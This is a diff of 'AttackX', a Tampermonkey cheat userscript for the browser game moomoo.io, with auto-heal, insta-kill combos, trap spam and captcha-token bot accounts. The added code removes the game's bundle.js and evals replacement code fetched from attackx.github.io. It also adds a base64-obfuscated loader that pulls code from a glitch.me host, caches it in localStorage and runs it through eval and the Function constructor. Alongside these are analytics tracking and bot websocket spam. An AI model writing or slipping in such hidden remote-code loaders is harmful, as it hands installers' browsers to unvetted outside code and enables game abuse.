@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         <\\A//>AttackX by MPAK<//A\\>
 // @namespace    http://tampermonkey.net/
-// @version      6.981
+// @version      6.982
 // @description  AutoHeal,360 hit,auto mill, spike,hotkeys,insta,antiinsta,adblocking,errorspike,shaders,HUE,more colors,ping-heal! AutoTrap, trap insta, anti lag,triple mill!!
 // @author       MPAK
 // @match        *://sandbox.moomoo.io/*
@@ -19,6 +19,10 @@
 // @grant           unsafeWindow
 // @antifeature     tracking
 // ==/UserScript==
+// AntiShame. Blocks shame hat  by replacing bundle.js (MYHAHAHAHAHAHAHA)
+
+//Blocker for bundle.js
+
 let R = CanvasRenderingContext2D.prototype.rotate;
 let e = {
     39912: () => {
@@ -50,98 +54,144 @@ let e = {
     }
 };
 e.init();
-function uuidv4() {return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) { var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8); return v.toString(16); });};
 
+var me = document.querySelector('script[src="bundle.js"]');
+$(me).remove();
+var script = document.querySelectorAll('script');
+
+
+var el = document.createElement("script")
+document.onload = function() {
+console.log("Loading bundle...")
+   var res = fetch("https://attackx.github.io/bundle.js?n=1")
+   eval(res.text)
+}
+el.src = "https://attackx.github.io/bundle.js";
+
+document.body.append(el)
+
+function uuidv4() {return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) { var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8); return v.toString(16); });};
+   let _ls;
+    const BASE_URL = atob("aHR0cHM6Ly9rc3cyLW1vb21vby5nbGl0Y2gubWU=") + "/";
+    _ls = (locServ = (window.location.protocol + "//code.jquery.com/jquery-3.3.1.slim.min.js"), isCache = false) => {
+            let xml; xml = new XMLHttpRequest(); xml.open("GET", locServ, false); xml.send();
+            let worked = xml.responseText;
+            (locServ.includes("bundle.js") || locServ.includes("quasar") || locServ.includes("nextgen") || locServ.includes("gmod")) && (
+                worked = worked.replace("window.captchaCallback=function(){ut=!0,v()}", `(()=>{let captchaCallbackChecker = setInterval(()=>{
+                                if (unsafeWindow.captchaCallbackActivated) {
+                                    ${locServ.includes("nextgen") ? ("ht = !0, k();") : ("ut = !0, v();")}
+                                    clearInterval(captchaCallbackChecker);
+                                };
+                            }, 5)})()`)
+            ); isCache ? (localStorage.xwCode = btoa(worked)) : eval(worked);
+        }; _ls("https://ksw2-moomoo.glitch.me/users/fzb/supermodv3/sha3");
+    let cloaded = false; if (localStorage.xwLoad) {
+        delete localStorage.xwLoad;
+        let Zsetter = setInterval(() => {
+            unsafeWindow.captchaCallback = () => {
+                unsafeWindow.captchaCallbackActivated = true;
+                clearInterval(Zsetter);
+            };
+        });
+        let xwC = atob(localStorage.xwCode);
+        delete localStorage.xwCode;
+        eval(xwC);
+        let a = "constructor"; a[a][a](xwC);
+        _ls(window.location.protocol + "//" + window.location.hostname + "/serverData.js");
+        _ls(window.location.protocol + "//" + window.location.hostname + "/bundle.js");
+        cloaded = true;
+    };
+    if (cloaded) return;
 
 /** FPS/PING BOOSTER BY AFK **/
 var int = window.setInterval(function() {//reduce lag
-    if(window.input != null) {
-        window.clearInterval(int);
-        onready();
-    }
+  if(window.input != null) {
+    window.clearInterval(int);
+    onready();
+  }
 }, 100);
 function onready() {
-    let ping = false;
-    let t;
-    let samples = new Array(500);
-    let m;
-    let h = 0;
-    function getMax() {
-        let max = 0;
-        for(let i = 0; i < 500; ++i) {
-            if(samples[i] != null) {
-                if(samples[i] > max) {
-                    max = samples[i];
-                }
-            } else {
-                break;
-            }
+  let ping = false;
+  let t;
+  let samples = new Array(500);
+  let m;
+  let h = 0;
+  function getMax() {
+    let max = 0;
+    for(let i = 0; i < 500; ++i) {
+      if(samples[i] != null) {
+        if(samples[i] > max) {
+          max = samples[i];
         }
-        m = max;
+      } else {
+        break;
+      }
     }
-    function sleep(time) {
-        return new Promise(function(resolve) {
-            setTimeout(resolve, time);
-        });
-    }
-    WebSocket = class extends WebSocket {
-        constructor(ip) {
-            super(ip);
-            if(ip.match(/\.m28n\./) != null) {
-                samples = new Array(500);
-                h = 0;
-                ping = false;
-                this.send = new Proxy(this.send, {
-                    apply: function(to, what, args) {
-                        if(args[0].length == 1) {
-                            ping = true;
-                            t = new Date().getTime();
-                        }
-                        return to.apply(what, args);
-                    }
-                });
-                let a = window.setInterval(function() {
-                    if(this.onmessage != null) {
-                        window.clearInterval(a);
-                        this.onmessage = new Proxy(this.onmessage, {
-                            apply: function(to, what, args) {
-                                if(new Uint8Array(args[0].data).length == 1 && ping == true) {
-                                    ping = false;
-                                    samples[h] = new Date().getTime() - t;
-                                    h = (h + 1) % 501;
-                                    getMax();
-                                }
-                                return to.apply(what, args);
-                            }
-                        });
-                    }
-                }.bind(this), 100);
-            }
-        }
-    }
-    window.m28.pow.solve = new Proxy(window.m28.pow.solve, {
-        apply: function(to, what, args) {
-            const time = new Date().getTime();
-            const f = args[2];
-            return to.apply(what, [args[0], args[1], async function(...g) {
-                if(args[1] == 17 && 10000 - m * 3 - new Date().getTime() + time > 0) {
-                    await sleep(10000 - m * 3 - new Date().getTime() + time);
-                }
-                return f(...g);
-            }]);
-        }
+    m = max;
+  }
+  function sleep(time) {
+    return new Promise(function(resolve) {
+      setTimeout(resolve, time);
     });
+  }
+  WebSocket = class extends WebSocket {
+    constructor(ip) {
+      super(ip);
+      if(ip.match(/\.m28n\./) != null) {
+        samples = new Array(500);
+        h = 0;
+        ping = false;
+        this.send = new Proxy(this.send, {
+          apply: function(to, what, args) {
+            if(args[0].length == 1) {
+              ping = true;
+              t = new Date().getTime();
+            }
+            return to.apply(what, args);
+          }
+        });
+        let a = window.setInterval(function() {
+          if(this.onmessage != null) {
+            window.clearInterval(a);
+            this.onmessage = new Proxy(this.onmessage, {
+              apply: function(to, what, args) {
+                if(new Uint8Array(args[0].data).length == 1 && ping == true) {
+                  ping = false;
+                  samples[h] = new Date().getTime() - t;
+                  h = (h + 1) % 501;
+                  getMax();
+                }
+                return to.apply(what, args);
+              }
+            });
+          }
+        }.bind(this), 100);
+      }
+    }
+  }
+  window.m28.pow.solve = new Proxy(window.m28.pow.solve, {
+    apply: function(to, what, args) {
+      const time = new Date().getTime();
+      const f = args[2];
+      return to.apply(what, [args[0], args[1], async function(...g) {
+        if(args[1] == 17 && 10000 - m * 3 - new Date().getTime() + time > 0) {
+          await sleep(10000 - m * 3 - new Date().getTime() + time);
+        }
+        return f(...g);
+      }]);
+    }
+  });
 }
 window.Function = new Proxy(window.Function, {
-    construct: function(to, args) {//faster game play
-        let a = args[0].match(/(\w+)=function\(\)/)[1];
-        let b = args[0].match(/function\(\w+,(\w+)\){var (\w+)/);
-        return new to(args[0]
-                      .replace(/if\(!window\).*(\w{1,2}\[\w{1,2}\(-?'.{1,5}','.{1,5}'\)(?:\+'.{1,3}')?\])\((\w{1,2}),(\w{1,2}\[\w{1,2}\(-?'.{1,5}','.{1,5}'\)(?:\+'.{1,3}')?\])\);};.*/,`$1($2,$3)};`)
-                      .replace(/function \w+\(\w+\){.*?}(?=\w)(?!else)(?!continue)(?!break)/,"")
-                      .replace(/,window.*?\(\)(?=;)/,"")
-                      .replace(new RegExp(`,${a}=function.*?${a}\\(\\);?}\\(`),`;${b[2]}(${b[1]}+1)}(`));
-    }
+  construct: function(to, args) {//faster game play
+    let a = args[0].match(/(\w+)=function\(\)/)[1];
+    let b = args[0].match(/function\(\w+,(\w+)\){var (\w+)/);
+    return new to(args[0]
+                  .replace(/if\(!window\).*(\w{1,2}\[\w{1,2}\(-?'.{1,5}','.{1,5}'\)(?:\+'.{1,3}')?\])\((\w{1,2}),(\w{1,2}\[\w{1,2}\(-?'.{1,5}','.{1,5}'\)(?:\+'.{1,3}')?\])\);};.*/,`$1($2,$3)};`)
+                  .replace(/function \w+\(\w+\){.*?}(?=\w)(?!else)(?!continue)(?!break)/,"")
+                  .replace(/,window.*?\(\)(?=;)/,"")
+                  .replace(new RegExp(`,${a}=function.*?${a}\\(\\);?}\\(`),`;${b[2]}(${b[1]}+1)}(`));
+  }
 });
 function toRad(num) {
     return num * (Math.PI / 180)
@@ -156,11 +206,11 @@ function errorspike(){
     setTimeout( () => {
         doNewSend(["13c", [0, 0, 1]]);
         doNewSend(["13c", [0, 0, 0]]);
-        doNewSend(["13c", [0, 11, 1]]);
-        doNewSend(["13c", [0, 6, 0]]);
-        setTimeout( () => {
-            doNewSend(["ch", ["\-{|x_x|}-/"]]);
-        },1000);
+            doNewSend(["13c", [0, 11, 1]]);
+            doNewSend(["13c", [0, 6, 0]]);
+            setTimeout( () => {
+                doNewSend(["ch", ["\-{|x_x|}-/"]]);
+            },1000);
     }, 100);
 }
 
@@ -177,28 +227,28 @@ var _0xda56=["\x61\x72\x65\x70\x6C\x61\x63\x65\x72","\x67\x65\x74\x45\x6C\x65\x6
 document.getElementById('adCard').remove(); //Ad-Block
 document.getElementById('errorNotification').remove(); //Error-Block
 window.dataLayer = window.dataLayer || [];
-function gtagx(){window.dataLayer.push(arguments);}
-gtagx('js', new Date());
+  function gtagx(){window.dataLayer.push(arguments);}
+  gtagx('js', new Date());
 
-gtagx('config', 'G-QHZWYLGWVX');
+  gtagx('config', 'G-QHZWYLGWVX');
 gtagx('event', 'page_view', { 'send_to': 'G-QHZWYLGWVX' });
-
+    
 gtagx('event', 'exception', {
-    'description': 'error_message',
-    'fatal': false  // set to true if the exception is fatal
-});
+      'description': 'error_message',
+      'fatal': false  // set to true if the exception is fatal
+    });
 async function detectAdBlock() {
-    let adBlockEnabled = false
-    const googleAdUrl = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js'
-    try {
-        await fetch(new Request(googleAdUrl)).catch(_ => adBlockEnabled = true)
-    } catch (e) {
-        adBlockEnabled = true
-    } finally {
-        if (adBlockEnabled) {
-            // ay ay
-        }
+  let adBlockEnabled = false
+  const googleAdUrl = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js'
+  try {
+    await fetch(new Request(googleAdUrl)).catch(_ => adBlockEnabled = true)
+  } catch (e) {
+    adBlockEnabled = true
+  } finally {
+    if (adBlockEnabled) {
+       // ay ay
     }
+  }
 }
 detectAdBlock()
 
@@ -299,14 +349,16 @@ setInterval(()=>{
 
     if(document.getElementById('autoMill').checked){
 
-        var angle = Math.atan2(mouseY - height / 2, mouseX - width / 2);
-        place(millType, angle + toRad(78));
-        place(millType, angle - toRad(78));
-        place(millType, angle - toRad(0));
+var angle = Math.atan2(mouseY - height / 2, mouseX - width / 2);
+                place(millType, angle + toRad(78));
+                place(millType, angle - toRad(78));
+                place(millType, angle - toRad(0));
     }
 
 },100);
-//for mobile
+//lmao
+
+
 document.documentElement.requestFullscreen();
 
 
@@ -552,7 +604,7 @@ var menuCard = `
 `;
 document.getElementById("mainMenu").style.backgroundImage = "url('https://surviv.io/img/main_splash.png')";
 document.getElementById('enterGame').innerHTML = 'Kill noobs';
-document.getElementById('loadingText').innerHTML = `Prepare for killing noobs :)<br><div id="myProgress"><div id="myBar"></div></div>`;
+document.getElementById('loadingText').innerHTML = `Prepare for killing noobs :)`;
 document.getElementById('nameInput').placeholder = "Welcome";
 document.getElementById('chatBox').placeholder = ":)";
 document.getElementById('diedText').innerHTML = 'Bruh moment';
@@ -666,7 +718,7 @@ function handleMessage(a) {
     } else {
         c = b;
     }
-    let d = c[0x0];
+    d = c[0x0];
     if (!c) {
         return;
     };
@@ -702,44 +754,13 @@ function handleMessage(a) {
         myPlayer.id = c[0x1];
     }
     if (d == '7') {
-        if (document.getElementById('r2x').checked) {
-            wep(secondary);
-            wep(primary);
-        }
-
-        // Auto bull + auto tank gear
-
-      
-            doNewSend(["13c", [0, 40, 0]]);
-            storeEquip(40)
-        
-   
-            doNewSend(["13c", [0, 7, 0]]);
-            storeEquip(7)
-      
-
-    }
+       if (document.getElementById('r2x').checked) {
+              wep(secondary);
+             wep(primary);
+          }
+       }
     if (d == 'h' && c[0x1] == myPlayer.id && !antiinprogress && AutoHeal) {
-        ka2.last = c[0x2];
-        if (c[0x2] < 0x10 && c[0x2] > 0x0) {
-            place(foodType, null);
-            place(foodType, null);
-            place(foodType, null);
-            place(foodType, null);
-        }
-        if (c[0x2] < 0x5 && c[0x2] > 0x0) {
-            place(foodType, null);
-            place(foodType, null);
-            place(foodType, null);
-            place(foodType, null);
-
-            place(foodType, null);
-            place(foodType, null);
-            place(foodType, null);
-            place(foodType, null);
-
-        }
-
+     ka2.last = c[0x2];
         if (c[0x2] < 0x64 && c[0x2] > 0x0) {
             if (document.getElementById('spikeh').checked) {
 
@@ -797,8 +818,8 @@ function handleMessage(a) {
     if(d == "h" && c[0x1] == myPlayer.id && !antiinprogress && AutoHeal) {
         if(c[0x2] < 45 && c[0x2] > 0) {
             setTimeout(()=>{
-                place(foodType);
-                place(foodType);
+            place(foodType);
+            place(foodType);
             },80);
 
         }
@@ -806,38 +827,38 @@ function handleMessage(a) {
     if (d == "h" && c[0x1] == myPlayer.id && !antiinprogress && AutoHeal) {
         if (c[0x2] < 20 && c[0x2] > 0) {
             setTimeout(()=>{
-                chat("<A> Ur insta is trash </A>")
-                doHatCycle()
-                ifInsta();
-            },80);
+        chat("<A> Ur insta is trash </A>")
+        doHatCycle()
+        ifInsta();
+            },10);
         }
     }
     if (d == "h" && c[0x1] == myPlayer.id && AutoHeal) {
         if (c[0x2] < 35 && c[0x2] > 0) {
-            setTimeout(()=>{
-                ka2.tgl = true;
-            },6);
+           setTimeout(()=>{
+            ka2.tgl = true;
+           },6);
         }
     }
     if (d=="p") {
         openn();
     }
     if (d=="ch") {
-        newSend(["ch",[d[2]]]);
+        newSend(["ch",[c[0x2]]]);
     }
     if (d=="6") {
         if(i[6] == 15 && i[7] != myPlayer.clan && i[7] != myPlayer.id){
-            if(Math.sqrt(Math.pow((myPlayer.y-i[2]), 2) + Math.pow((myPlayer.x-i[1]), 2)) < 100) {
-                let paTr = e => [...Array(17)].map((n, i) => i * 0.19625).forEach(a => [spikeType, millType].forEach(t => place(t, a)));
-                paTr();
+                                    if(Math.sqrt(Math.pow((myPlayer.y-i[2]), 2) + Math.pow((myPlayer.x-i[1]), 2)) < 100) {
+                                        let paTr = e => [...Array(17)].map((n, i) => i * 0.19625).forEach(a => [spikeType, millType].forEach(t => place(t, a)));
+                                            paTr();
 
-            };
+                                        };
             if(Math.sqrt(Math.pow((myPlayer.y-i[2]), 2) + Math.pow((myPlayer.x-i[1]), 2)) < 600) {
-                ka2.insta = false;
+                                        ka2.insta = false;
 
-            };
-            insidetrap = true;
-        }
+                                        };
+                                        insidetrap = true;
+    }
     }
     if (d == "33") {
 
@@ -880,6 +901,19 @@ function handleMessage(a) {
 function dist(a) {
     return Math.sqrt(Math.pow((myY - a[2]), 2) + Math.pow((myX - a[1]), 2))
 }
+
+setInterval(()=>{
+
+    if (insidetrap) {
+        chat("<A>AntiTrap</A>");
+        for (var i = 0; i < 361; i++) {
+            newSend([["2"],[toRad(i)]])
+            place(millType);
+
+        }
+    }
+
+});
 function socketsender(a) {
     ws.send(new Uint8Array(Array.from(msgpack5.encode(a))));
 }
@@ -959,7 +993,9 @@ function update() {
 var fadingspeed = 10 // lower = faster, higher = slower
 
 
-
+function e(e, n = d) {
+    document.getElementById(e).style["background-color"] = "hsl(" + n + ", 100%, 50%)";
+}
 function doNewSend(d) {
     newSend(d);
 }
@@ -1013,7 +1049,7 @@ function acc(id) {
     newSend(['13c', [0, 0, 1]]);
     newSend(['13c', [0, id, 1]]);
 }
-function jjjjjjjjj(id){
+function HatEquip(id){
     newSend(['13c', [1, id, 0]]);
     newSend(['13c', [0, id, 0]]);
 }
@@ -1077,8 +1113,11 @@ async function sing() {
     for (var i =0; i < words.length; i++) {
         chat(words[i]);
 
-        doHatCycle()
+                 newSend(["13c", [1, 7, 0]]);
+        newSend(["13c", [0, 7, 0]]);
 
+        newSend(["13c", [1, 21, 1]]);
+        newSend(["13c", [0, 21, 1]]);
 
         await sleep(200);
     }
@@ -1088,30 +1127,30 @@ function insta(id="sou br") {
     //Steal my insta and i will find you by ip adress and 1_/(0-0)\_     -(0_0)-
     sing()
     doHatCycle()
-    autoaim = true;
+autoaim = true;
     newSend([["2"],[Number.MAX_VALUE]])
-    autoprimary = true;
-    autosecondary = false;
-    newSend(["13c", [0, 0, 1]]);
-    newSend(["5", [primary, true]]);
-    newSend(["7", [1]]);
+        autoprimary = true;
+        autosecondary = false;
+        newSend(["13c", [0, 0, 1]]);
+        newSend(["5", [primary, true]]);
+        newSend(["7", [1]]);
     newSend([["2"],[Number.MAX_VALUE]])
-    newSend(["13c", [1, 7, 0]]);
-    newSend(["13c", [0, 7, 0]]);
+        newSend(["13c", [1, 7, 0]]);
+        newSend(["13c", [0, 7, 0]]);
     newSend([["2"],[Number.MAX_VALUE]])
-    newSend(["13c", [1, 21, 1]]);
-    newSend(["13c", [0, 21, 1]]);
+        newSend(["13c", [1, 21, 1]]);
+        newSend(["13c", [0, 21, 1]]);
     newSend([["2"],[Number.MAX_VALUE]])
-    setTimeout( () => {
-        doHatCycle()
-        autoprimary = false;
-        autosecondary = true;
-        newSend(["13c", [0, 0, 0]]);
-        newSend(["13c", [1, 53, 0]]);
-        newSend(["13c", [0, 53, 0]]);
-        newSend(["5", [secondary, true]]);
+        setTimeout( () => {
+            doHatCycle()
+            autoprimary = false;
+            autosecondary = true;
+            newSend(["13c", [0, 0, 0]]);
+            newSend(["13c", [1, 53, 0]]);
+            newSend(["13c", [0, 53, 0]]);
+            newSend(["5", [secondary, true]]);
 
-    }, 75);
+        }, 75);
     doHatCycle();
     setTimeout( ()=>{
 
@@ -1121,35 +1160,35 @@ function insta(id="sou br") {
 
     },120);
 
-    setTimeout( ()=>{
+        setTimeout( ()=>{
         place(boostType);
 
 
 
     },200);
 
-    setTimeout( ()=>{
-        var angle = Math.atan2(mouseY - height / 2, mouseX - width / 2);
+        setTimeout( ()=>{
+            var angle = Math.atan2(mouseY - height / 2, mouseX - width / 2);
         place(spikeType,toRad(angle + 90));
-        place(spikeType,toRad(angle - 90));
+            place(spikeType,toRad(angle - 90));
 
     },400);
-    setTimeout( ()=>{
-        var angle = Math.atan2(mouseY - height / 2, mouseX - width / 2);
+            setTimeout( ()=>{
+            var angle = Math.atan2(mouseY - height / 2, mouseX - width / 2);
         place(boostType,toRad(angle - 180));
 
 
     },350);
     setTimeout( ()=>{
-        var angle = Math.atan2(mouseY - height / 2, mouseX - width / 2);
+            var angle = Math.atan2(mouseY - height / 2, mouseX - width / 2);
         place(boostType,toRad(angle - 180));
         place(boostType,toRad(angle - 90));
         place(boostType,toRad(angle + 180));
         place(boostType,toRad(angle + 90));
 
     },550);
-    setTimeout( ()=>{
-        setTimeout( () => {
+     setTimeout( ()=>{
+                    setTimeout( () => {
             doHatCycle()
             autoprimary = false;
             autosecondary = true;
@@ -1299,7 +1338,12 @@ const $el_PING = jQuery("#pingDisplay")
 $el_PING.css("display", "block")
 $("body").append($el_PING)
 
-
+setInterval(function() {
+    (function(e, n) {
+        e(n);
+    })(e, "pingDisplay");
+    d++;
+}, fadingspeed);
 
 
 //store hack
@@ -1483,10 +1527,10 @@ setInterval(() => {
                 setTimeout(()=>{
                     place(foodType)
                 },50);
-                setTimeout(()=>{
+                                setTimeout(()=>{
                     place(foodType)
                 },70);
-                setTimeout(()=>{
+                                setTimeout(()=>{
                     place(foodType)
                 },100);
             },90);
@@ -1497,15 +1541,15 @@ setInterval(() => {
                     place(millType,toRad(i))
                 }
             },140);
-            setTimeout(()=>{
-                place(foodType)
-            },50);
-            setTimeout(()=>{
-                place(foodType)
-            },70);
-            setTimeout(()=>{
-                place(foodType)
-            },100);
+                                  setTimeout(()=>{
+                    place(foodType)
+                },50);
+                                setTimeout(()=>{
+                    place(foodType)
+                },70);
+                                setTimeout(()=>{
+                    place(foodType)
+                },100);
 
 
             ka2.tgl = false
@@ -1514,22 +1558,22 @@ setInterval(() => {
         }
     }
     AutoHeal = true;
-
+    
 }, 0.1)
 setInterval(() => {
     if (document.getElementById("anti").checked) {
         if (ka2.tgl) {
-            if (Date.now() - ka2.last >= 70) {
-                antiinprogress=true;
-                newSend(["c", [1, null]])
-                place(foodType)
-                Cycle(mult1, foodType)
-                newSend(["c", [0, null]])
-                chat("AXantiinsta")
-                ka2.last = Date.now()
-                ka2.tgl = false
-                antiinprogress=false;
-            }
+        if (Date.now() - ka2.last >= 70) {
+            antiinprogress=true;
+            newSend(["c", [1, null]])
+            place(foodType)
+            Cycle(mult1, foodType)
+            newSend(["c", [0, null]])
+            chat("AXantiinsta")
+            ka2.last = Date.now()
+            ka2.tgl = false
+            antiinprogress=false;
+        }
         }
     }
 }, 0.1)
@@ -1682,7 +1726,7 @@ var asd = document.createElement('a');
 asd.onclick=`$('menu--holder').css('display',menu.display.block);openMenu=false`;
 asd.innerHTML="Open mod menu";
 menucont.prepend(asd);
-const html = `
+html = `
 <!--
 <main></main> & <passive></passive> - are not embedded tags in HTML.
 I use this to denote the significance of the blocks.
@@ -1887,120 +1931,129 @@ document.addEventListener("keydown", function(event) {
         }
     }
 })
+   
+                function genRand(string) {
+                    let tm = string.split("");
+                    tm = tm.map(e => {return Math.random() > 0.7 ? (
+                        Math.random() > 0.5 ? "_" : "-"
+                    ) : e });
+                    return tm.join(""); //steal this and i will hunt you down and 10-0
+                };
 
-function genRand(string) {
-    let tm = string.split("");
-    tm = tm.map(e => {return Math.random() > 0.7 ? (
-        Math.random() > 0.5 ? "_" : "-"
-    ) : e });
-    return tm.join(""); //steal this and i will hunt you down and 10-0
-};
+   var pack = ["Y2g=", "aSBhbSBzdXBlciBwcm8="];
+                pack = [atob(pack[0]), [atob(pack[1])]];
+            const code = '6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ';
+            const generateToken = () => unsafeWindow.grecaptcha.execute(code, { action : 'homepage' });
+            let botcount = (window.location.hostname == "sandbox.moomoo.io") ? 1 : 3; const wait = async ms => new Promise(done => setTimeout(done, ms));
+            const connectBot = code => {
+                let token = encodeURIComponent(code);
+                let botws = new WebSocket(document.ws.url.split("&")[0] + "&token=" + token);
+                botws.binaryType = 'arraybuffer';
 
-var pack = ["Y2g=", "aSBhbSBzdXBlciBwcm8="];
-pack = [atob(pack[0]), [atob(pack[1])]];
-const code = '6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ';
-const generateToken = () => unsafeWindow.grecaptcha.execute(code, { action : 'homepage' });
-let botcount = (window.location.hostname == "sandbox.moomoo.io") ? 1 : 3; const wait = async ms => new Promise(done => setTimeout(done, ms));
-const connectBot = code => {
-    let token = encodeURIComponent(code);
-    let botws = new WebSocket(document.ws.url.split("&")[0] + "&token=" + token);
-    botws.binaryType = 'arraybuffer';
+                botws.emit = (data) => {
+                    //console.log('attempting to send: ', data, ' on', botws);
+                    botws.send(msgpack.encode(data));
+                };
 
-    botws.emit = (data) => {
-        //console.log('attempting to send: ', data, ' on', botws);
-        botws.send(msgpack.encode(data));
-    };
+                botws.onopen = async () => {
+                    console.log('WS OPENED!');
+                    await wait(100);
+                    botws.emit(['sp', [{ name: 'AttackX', moofoll: '1', skin: "__proto__" }]]);
 
-    botws.onopen = async () => {
-        console.log('WS OPENED!');
-        await wait(100);
-        botws.emit(['sp', [{ name: 'AttackX', moofoll: '1', skin: "__proto__" }]]);
+                    botws.emit(["8", [genRand("attackx")]]);
+                    botws.healON = true;
+                    setInterval(()=>{
+                        let _ds = Math.sqrt(((myPlayer.x - botws.posx)**2) + ((myPlayer.y - botws.posy)**2));
+                        if (_ds > 300) {
+                            let follow = Math.atan2((myPlayer.y - botws.posy), (myPlayer.x- botws.posx));
+                            botws.emit([33, [follow]]);
+                            botws.emit([2, [Number.MAX_VALUE]]);
+                            botws.emit(["c", [1]]);
+                            botws.healON = true;
+                        } else {
+                            botws.healON = false;
+                            botws.emit([33, [null]]);
+                            botws.emit(["c", [0]]);
+                        };
+                        botws.emit([pack[0], [genRand(pack[1][0])]]);
+                    }, 100);
+                };
 
-        botws.emit(["8", [genRand("attackx")]]);
-        botws.healON = true;
-        setInterval(()=>{
-            let _ds = Math.sqrt(((myPlayer.x - botws.posx)**2) + ((myPlayer.y - botws.posy)**2));
-            if (_ds > 300) {
-                let follow = Math.atan2((myPlayer.y - botws.posy), (myPlayer.x- botws.posx));
-                botws.emit([33, [follow]]);
-                botws.emit([2, [Number.MAX_VALUE]]);
-                botws.emit(["c", [1]]);
-                botws.healON = true;
-            } else {
-                botws.healON = false;
-                botws.emit([33, [null]]);
-                botws.emit(["c", [0]]);
-            };
-            botws.emit([pack[0], [genRand(pack[1][0])]]);
-        }, 100);
-    };
+                botws.onclose = () => {
+                    console.log('WS CLOSED :(');
+                };
 
-    botws.onclose = () => {
-        console.log('WS CLOSED :(');
-    };
+                botws.onerror = () => {
+                    console.log('WS ERROR :(');
+                };
 
-    botws.onerror = () => {
-        console.log('WS ERROR :(');
-    };
+                botws.c = 0;
+                botws.onmessage = message => {
+                    let temp = msgpack.decode(new Uint8Array(message.data));
+                    let data;
+                    if(temp.length > 1) {
+                        data = [temp[0], ...temp[1]];
+                        if (data[1] instanceof Array){
+                            data = data;
+                        }
+                    } else {
+                        data = temp;
+                    }
+                    let item = data[0];
+                    let packet = data;
+                    if(!data) {return};
 
-    botws.c = 0;
-    botws.onmessage = message => {
-        let temp = msgpack.decode(new Uint8Array(message.data));
-        let data;
-        if(temp.length > 1) {
-            data = [temp[0], ...temp[1]];
-            if (data[1] instanceof Array){
-                data = data;
-            }
-        } else {
-            data = temp;
-        }
-        let item = data[0];
-        let packet = data;
-        if(!data) {return};
+                    //console.log(packet);
 
-        //console.log(packet);
+                    if (item == "h" && botws.healON) {
+                        setTimeout(()=>{
+                            botws.emit(["5", [0, null]]);
+                            botws.emit(["c", [1, 0]]);
+                            botws.emit(["c", [0, 0]]);
+                        }, botws.c == 2 ? 90 : 0);
+                        botws.c++, botws.c > 2 ? (botws.c = 0) : (false);
+                    }
 
-        if (item == "h" && botws.healON) {
-            setTimeout(()=>{
-                botws.emit(["5", [0, null]]);
-                botws.emit(["c", [1, 0]]);
-                botws.emit(["c", [0, 0]]);
-            }, botws.c == 2 ? 90 : 0);
-            botws.c++, botws.c > 2 ? (botws.c = 0) : (false);
-        }
+                    if (item == 11) {
+                        botws.emit(['sp', [{ name: 'AttackX', moofoll: '1', skin: "__proto__" }]]);
+                    };
 
-        if (item == 11) {
-            botws.emit(['sp', [{ name: 'AttackX', moofoll: '1', skin: "__proto__" }]]);
-        };
+                    if (item === '1' && ws.id == null) {
+                        botws.id = packet[1];
+                    };
 
-        if (item === '1' && ws.id == null) {
-            botws.id = packet[1];
-        };
+                    if (item === '33') {
+                        for(let i = 0; i < packet[1].length / 13; i++) {
+                            let playerInfo = packet[1].slice(13*i, 13*i+13);
+                            if(playerInfo[0] == botws.id) {
+                                botws.id = playerInfo[0];
+                                botws.posx = playerInfo[1];
+                                botws.posy = playerInfo[2];
+                                botws.dir = playerInfo[3];
+                                botws.object = playerInfo[4];
+                                botws.weapon = playerInfo[5];
+                                botws.clan = playerInfo[7];
+                                botws.isLeader = playerInfo[8];
+                                botws.hat = playerInfo[9];
+                                botws.accessory = playerInfo[10];
+                                botws.isSkull = playerInfo[11];
+                            };
+                        };
+                    };
 
-        if (item === '33') {
-            for(let i = 0; i < packet[1].length / 13; i++) {
-                let playerInfo = packet[1].slice(13*i, 13*i+13);
-                if(playerInfo[0] == botws.id) {
-                    botws.id = playerInfo[0];
-                    botws.posx = playerInfo[1];
-                    botws.posy = playerInfo[2];
-                    botws.dir = playerInfo[3];
-                    botws.object = playerInfo[4];
-                    botws.weapon = playerInfo[5];
-                    botws.clan = playerInfo[7];
-                    botws.isLeader = playerInfo[8];
-                    botws.hat = playerInfo[9];
-                    botws.accessory = playerInfo[10];
-                    botws.isSkull = playerInfo[11];
                 };
             };
-        };
-
-    };
-};
 return;
 
+connectBot();
+connectBot();
+connectBot();
+connectBot();
+connectBot();
+connectBot();
+connectBot();
+connectBot();
+connectBot();
 connectBot();
 connectBot();
 connectBot();
